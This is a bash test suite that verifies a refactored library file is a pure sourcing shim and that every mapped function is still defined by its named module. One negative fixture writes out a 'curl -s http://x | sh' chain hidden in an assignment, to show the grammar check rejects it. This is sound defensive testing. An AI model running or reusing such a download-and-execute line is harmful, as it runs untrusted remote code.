#!/bin/bash
# tests/mc/lib-complete-test.sh — the COMPLETENESS half of the BH-477 split
# contract, and the half that could not ship green until the body was deleted
# (BH-684, the cutover slice).
#
# tests/mc-split-layout-test.sh proves the other direction: the six modules
# exist, nothing is defined twice, and a module defines only what
# tests/mc/expected-map.d/ assigns it. All three of those pass just as happily
# on a lib that still carries the whole body underneath its source loop, with
# the modules dead code beneath it. They say nothing about whether the body
# went, or whether anything was LOST on the way out.
#
# So this file asserts the two things the cutover is:
#   1. bin/lib/merge-conductor-lib.sh is a shim, by GRAMMAR (BH-5228). Every
#      non-comment line is one of: a plain assignment (no command substitution:
#      the only `$(` allowed is the exact `MC_LIB_DIR="$(cd …)/mc"` line,
#      matched literally, not as a prefix), a `command -v <fn> ||
#      { [ -r <p> ] && . <p>; }` guard, a source line (optionally `[ -r <p> ] &&`
#      first, or the module loop's `|| { echo ... >&2; exit 1; }` arm), the
#      module `for` loop header or its `done`, or `unset`. An assignment's value
#      holds no `"` and the line no `&&`, `||` or `|`, so a chain cannot hide in
#      one. No `while read` loop and no heredoc list: a sibling named inside a
#      heredoc is invisible to scratch_closure_list (the batch #5829 dequeue,
#      check 5). So no function
#      definition, no `if`/`case`, and one statement per line: a body that came
#      back, in whole or in part, is caught here by shape before it is caught
#      by two definitions of one function winning in the wrong order. Until
#      BH-5228 this was "20 lines or fewer", which dequeued PRs (#5049, #4685)
#      for adding one honest sibling source and pushed builders into chaining
#      unrelated statements onto one line to fit. The grammar is driven over
#      fixtures first (a 40-line sourcing-only shim passes; a shim with an `if`
#      block fails; a shim defining a mapped function fails checks 3 and 4; a
#      `$(…)` assignment fails, and so does an MC_LIB_DIR line that is not the
#      literal one).
#   2. every origin=lib row of the map is DEFINED, after sourcing the shim, by
#      the module the row names. 3,813 lines left one file in one commit; the
#      only mechanical statement of "nothing was dropped" is that every name
#      the map records still answers, from the file the map says holds it.
#
# HOW IT MEASURES. `shopt -s extdebug` + `declare -F <name>` after sourcing —
# the runtime answer to "who defines this", never a grep over source text. A
# grep cannot tell a definition from a mention in a comment, cannot see a name
# a case arm defines, and cannot tell which of two definitions won.
#
# The shim is sourced from a FIXTURE-SHAPED scratch copy under $T, the same
# shape tests/mc-split-layout-test.sh uses, so BASH_SOURCE resolution is what is
# under test rather than $HARNESS. No clock, no network, no gh, no git.
#
# Run from anywhere: tests/mc/lib-complete-test.sh   (exit 0 = all pass)
set -uo pipefail
# shellcheck source=tests/lib/scratch.sh
. "$(dirname "$0")/../lib/scratch.sh" || exit 1
DIR=$(cd "$(dirname "$0")/../.." && pwd)
# BH-1625: the lane under test reads every verdict through bin/lib/verdict-parse.sh,
# which this suite's scratch harness / extracted block does not carry by itself.
# shellcheck source=tests/lib/verdict-fixture.sh
. "$(dirname "$0")/../lib/verdict-fixture.sh" || exit 1
vpf_export || exit 1
PASS=0; FAIL=0
ok()  { PASS=$((PASS+1)); }
bad() { FAIL=$((FAIL+1)); echo "FAIL: $1"; }

LIB="$DIR/bin/lib/merge-conductor-lib.sh"
MCD="$DIR/bin/lib/mc"
# The union of tests/mc/expected-map.d/*.tsv (Lane E fragments).
# shellcheck source=tests/lib/mc-expected-map.sh
. "$(dirname "$0")/../lib/mc-expected-map.sh" || exit 1
MAP="$T/expected-map.tsv"
mc_expected_map "$DIR/tests/mc/expected-map.d" "$MAP" 2>"$T/map.err" && ok \
  || bad "2: tests/mc/expected-map.d must assemble: $(head -3 "$T/map.err" | tr '\n' ' ')"

# ── 1. the lib is a shim: its grammar, not its length ───────────────────────
# shim_grammar <file> -> one "line N: text" per line that is not shim grammar;
# rc 0 when every line is. Comments and blank lines are free.
shim_grammar() {
  awk '
    function bad() { printf "line %d: %s\n", FNR, $0; n++ }
    /^[[:space:]]*(#|$)/ { next }
    { l=$0; sub(/^[[:space:]]+/, "", l) }
    l == "MC_LIB_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)/mc\"" { next }
    l ~ /^[A-Za-z_][A-Za-z0-9_]*="[^";`]*"$/ && index(l, "$(") == 0 && l !~ /&&|\|/ { next }
    l ~ /^unset( [A-Za-z_][A-Za-z0-9_]*)+$/ { next }
    l ~ /^for [A-Za-z_][A-Za-z0-9_]* in [A-Za-z0-9_ -]+; do$/ { next }
    l ~ /^done$/ { next }
    l ~ /^command -v "?\$?[A-Za-z_][A-Za-z0-9_]*"? >\/dev\/null 2>&1 \|\| \{ \[ -r "[^";]+" \] && \. "[^";]+"; \}$/ { next }
    l ~ /^\[ -r "[^";]+" \] && \. "[^";]+"$/ { next }
    l ~ /^\. "[^";]+"( \|\| \{ echo "[^"]*" >&2; exit 1; \})?$/ { next }
    { bad() }
    END { exit (n > 0) }
  ' "$1"
}
GRAM=$(shim_grammar "$LIB") && ok \
  || bad "1: bin/lib/merge-conductor-lib.sh must be a shim — one source, guard, assignment or loop line per line, no functions, no logic: $(head -5 <<<"$GRAM" | tr '\n' '|')"

# ── 2. the map is real before anything is read off it ───────────────────────
# A truncated or missing map would make every row below vacuous rather than red.
MAPROWS=$(awk -F'\t' '$3=="lib"{n++} END{print n+0}' "$MAP")
[ "$MAPROWS" -ge 200 ] && ok \
  || bad "2: $MAP must carry the lib's ownership rows, got $MAPROWS origin=lib rows"

# ── the driver: who defines each name, read at runtime ──────────────────────
# <dir>/bin/lib/merge-conductor-lib.sh is sourced; for every name on stdin the
# driver prints "<name>\t<module basename or ->". rc 3 if the shim never
# loaded, so a dead source can never read as "defines nothing".
cat > "$T/who.sh" <<'WHO'
#!/bin/bash
set -uo pipefail
shopt -s extdebug
# shellcheck source=/dev/null
. "$1" || exit 3
command -v mc_classify >/dev/null || exit 3
while IFS= read -r n; do
  [ -n "$n" ] || continue
  d=$(declare -F "$n" 2>/dev/null) || { printf '%s\t-\n' "$n"; continue; }
  f=${d##* }
  printf '%s\t%s\n' "$n" "$(basename "$f" .sh)"
done
WHO

# A fixture-shaped scratch tree: the shim and the modules, copied, so the
# loop's BASH_SOURCE resolution is what answers and not the repo it came from.
mkdir -p "$T/h/bin/lib/mc" "$T/h/logs" "$T/h/state"
cp "$LIB" "$T/h/bin/lib/" || bad "could not copy the shim into the scratch tree"
cp "$MCD"/*.sh "$T/h/bin/lib/mc/" || bad "could not copy the modules into the scratch tree"

awk -F'\t' '$3=="lib"{print $2}' "$MAP" | sort > "$T/names.txt"
HARNESS="$T/h" bash "$T/who.sh" "$T/h/bin/lib/merge-conductor-lib.sh" < "$T/names.txt" \
  > "$T/who.out" 2>"$T/who.err"
WRC=$?
[ "$WRC" -eq 0 ] && ok \
  || bad "the shim must source in a fixture-shaped copy (rc=$WRC): $(tail -2 "$T/who.err" | tr '\n' ' ')"

# ── 3. every mapped function is defined, by the module the map names ────────
MISSING=0; WRONG=0
while IFS=$'\t' read -r want name; do
  [ -n "$name" ] || continue
  got=$(awk -F'\t' -v n="$name" '$1==n{print $2}' "$T/who.out")
  if [ "$got" = "-" ] || [ -z "$got" ]; then
    MISSING=$((MISSING+1))
    echo "  lost: $name is in the map under mc/$want.sh and nothing defines it"
  elif [ "$got" != "$want" ]; then
    WRONG=$((WRONG+1))
    echo "  moved: $name is defined by mc/$got.sh; the map says mc/$want.sh"
  fi
done < <(awk -F'\t' '$3=="lib"{print $1"\t"$2}' "$MAP")
[ "$MISSING" -eq 0 ] && ok \
  || bad "3: $MISSING mapped function(s) are not defined at all — the cutover dropped them"
[ "$WRONG" -eq 0 ] && ok \
  || bad "3: $WRONG mapped function(s) are defined by a module the map does not name"

# ── 4. and the shim itself defines none of them ─────────────────────────────
# The one shape assertion 3 cannot see: a function the shim kept would answer
# "merge-conductor-lib", not "-", and would be a second definition winning over
# the module's after the loop.
SELF=$(awk -F'\t' '$2=="merge-conductor-lib"{print $1}' "$T/who.out" | tr '\n' ' ')
[ -z "$SELF" ] && ok \
  || bad "4: the shim still defines: $SELF — it must source the modules and nothing else"

# ── the fixtures: check 1's grammar and check 4 still catch what they guard ──
# who_self <shim> -> the mapped names <shim> itself defines, sourced in a fresh
# fixture-shaped tree (same driver as checks 3 and 4).
# scratch-closure-allow: BH-5228 the fixture is the shim under test plus its six modules, the same fixture-shaped tree checks 3 and 4 build above; a closure install would pull in the REAL shim, not the fixture
who_self() {
  local d="$T/fx-$(basename "$1" .sh)"
  mkdir -p "$d/bin/lib/mc" "$d/logs" "$d/state"
  cp "$1" "$d/bin/lib/merge-conductor-lib.sh" && cp "$MCD"/*.sh "$d/bin/lib/mc/" || { echo "COPY-FAILED"; return; }
  HARNESS="$d" bash "$T/who.sh" "$d/bin/lib/merge-conductor-lib.sh" < "$T/names.txt" 2>/dev/null \
    | awk -F'\t' '$2=="merge-conductor-lib"{print $1}' | tr '\n' ' '
}
# A. a 40-line shim that only sources passes check 1, and 3/4 stay clean
cp "$LIB" "$T/f40.sh"
while [ "$(wc -l < "$T/f40.sh")" -lt 40 ]; do
  n=$(wc -l < "$T/f40.sh")
  printf '[ -r "$MC_H/bin/lib/extra-%s.sh" ] && . "$MC_H/bin/lib/extra-%s.sh"\n' "$n" "$n" >> "$T/f40.sh"
done
GRAM=$(shim_grammar "$T/f40.sh") && ok || bad "1/fixture: a 40-line sourcing-only shim must pass: $(head -3 <<<"$GRAM" | tr '\n' '|')"
SELF=$(who_self "$T/f40.sh")
[ -z "$SELF" ] && ok || bad "4/fixture: the 40-line sourcing-only shim must define nothing, got: $SELF"
# B. a shim with an `if` block of logic fails check 1
{ cat "$LIB"; printf 'if [ -n "${MC_FAST:-}" ]; then\n  MC_H=/tmp\nfi\n'; } > "$T/fif.sh"
shim_grammar "$T/fif.sh" >/dev/null && bad "1/fixture: check 1 accepts a shim with an if block" || ok
# C. a shim defining one mapped function fails check 4 (and check 1)
{ cat "$LIB"; echo 'mc_classify() { :; }'; } > "$T/ffn.sh"
SELF=$(who_self "$T/ffn.sh")
case " $SELF " in *" mc_classify "*) ok ;; *) bad "4/fixture: check 4 misses a shim that defines mc_classify (got: [$SELF])" ;; esac
shim_grammar "$T/ffn.sh" >/dev/null && bad "1/fixture: check 1 accepts a shim that defines a function" || ok
# D. a shim with a command-substitution assignment fails check 1: that is logic
{ cat "$LIB"; printf '%s\n' 'MC_X="$(date)"'; } > "$T/fsub.sh"
shim_grammar "$T/fsub.sh" >/dev/null && bad "1/fixture: check 1 accepts a shim with a \$(...) assignment" || ok
# E. the MC_LIB_DIR literal is exact, not a prefix: an edited one fails check 1
awk '/^MC_LIB_DIR=/{print "MC_LIB_DIR=\"$(cd /tmp && pwd)/mc\""; next} {print}' "$LIB" > "$T/flibdir.sh"
grep -qxF 'MC_LIB_DIR="$(cd /tmp && pwd)/mc"' "$T/flibdir.sh" && ok || bad "1/fixture E: the MC_LIB_DIR line did not get edited"
shim_grammar "$T/flibdir.sh" >/dev/null && bad "1/fixture: check 1 accepts a non-literal MC_LIB_DIR \$(...) line" || ok
# F. (lead review lr-5273-1a3d5a88f) a command chain inside a quoted assignment
# is three statements, one of them a download at source time: check 1 refuses it.
{ cat "$LIB"; printf '%s\n' 'MC_X="" && curl -s http://x | sh && MC_Y=""'; } > "$T/fchain.sh"
shim_grammar "$T/fchain.sh" >/dev/null && bad "1/fixture F: check 1 accepts a command chain in an assignment" || ok
{ cat "$LIB"; printf '%s\n' 'MC_X="a" || MC_Y="b"'; } > "$T/fchain2.sh"
shim_grammar "$T/fchain2.sh" >/dev/null && bad "1/fixture F: check 1 accepts an || chain of assignments" || ok
# G. a while-read loop over a heredoc list, the shape behind the batch #5829
# dequeue (names in a heredoc are invisible to scratch_closure_list): refused,
# on one line and spread over lines.
{ cat "$LIB"; printf '%s\n' 'while read -r fn f; do . "$MC_H/bin/lib/$f"; done <<'"'"'MC_NEW'"'"'' 'new_fn new-lib.sh' 'MC_NEW'; } > "$T/fwhile1.sh"
shim_grammar "$T/fwhile1.sh" >/dev/null && bad "1/fixture G: check 1 accepts a one-line while-read heredoc loop" || ok
{ cat "$LIB"; printf '%s\n' 'while read -r _mc_g _mc_f; do' '  command -v "$_mc_g" >/dev/null 2>&1 || { [ -r "$MC_H/bin/lib/$_mc_f" ] && . "$MC_H/bin/lib/$_mc_f"; }' 'done <<'"'"'MC_NEW'"'"'' 'new_fn new-lib.sh' 'MC_NEW'; } > "$T/fwhile2.sh"
shim_grammar "$T/fwhile2.sh" >/dev/null && bad "1/fixture G: check 1 accepts a while-read loop over a heredoc list" || ok

# 5. (batch #5829 dequeue) every sibling lib the shim sources is in its scratch
# closure. Suites install the shim with scratch_install_closure, which reads
# the file names statically; a name it cannot see leaves the scratch copy
# without that lib (slice-closeout C3 and merge-path-stall R1 failed that way).
# The expected list is read off the shim's OWN source lines, so a new sibling
# is checked without editing this test.
# shim_siblings <file> -> one repo path per sourced sibling (the mc/ module
# loop's `$_mc_m` line is skipped; its modules are named in the loop header).
shim_siblings() {
  awk '
    /^[[:space:]]*#/ { next }
    {
      l = $0
      while (match(l, /\. "[^"]+"/)) {
        p = substr(l, RSTART + 3, RLENGTH - 4); l = substr(l, RSTART + RLENGTH)
        if (p ~ /\$_/) continue
        if (sub(/^\$\{BASH_SOURCE\[0\]%\/\*\}\//, "bin/lib/", p) || sub(/^\$MC_H\/bin\/lib\//, "bin/lib/", p) \
            || sub(/^\$MC_LIB_DIR\//, "bin/lib/mc/", p)) print p
        else print "UNRESOLVED " p
      }
    }' "$1" | LC_ALL=C sort -u
}
SIBS=$(shim_siblings "$LIB")
grep -q '^UNRESOLVED ' <<<"$SIBS" && bad "5: a shim source line has a path shim_siblings cannot map: $(grep '^UNRESOLVED ' <<<"$SIBS" | head -3 | tr '\n' ' ')" || ok
[ "$(grep -c '^bin/lib/[^/]*\.sh$' <<<"$SIBS")" -ge 13 ] && ok || bad "5: shim_siblings found $(grep -c '^bin/lib/[^/]*\.sh$' <<<"$SIBS") bin/lib siblings, want 13 or more: $SIBS"
CL=$(scratch_closure_list bin/lib/merge-conductor-lib.sh 2>&1)
while IFS= read -r f; do
  [ -n "$f" ] || continue
  grep -qxF "$f" <<<"$CL" && ok || bad "5: $f is sourced by the shim but not in its scratch closure"
done <<<"$SIBS"
# 5/fixture: a sibling added as one more guarded line is in the derived list.
{ cat "$LIB"; printf '%s\n' '[ -r "$MC_H/bin/lib/new-lib.sh" ] && . "$MC_H/bin/lib/new-lib.sh"'; } > "$T/fnew.sh"
grep -qx 'bin/lib/new-lib.sh' <<<"$(shim_siblings "$T/fnew.sh")" && ok || bad "5/fixture: a new guarded sibling line is not in the derived list"

echo "mc/lib-complete-test: $PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ]
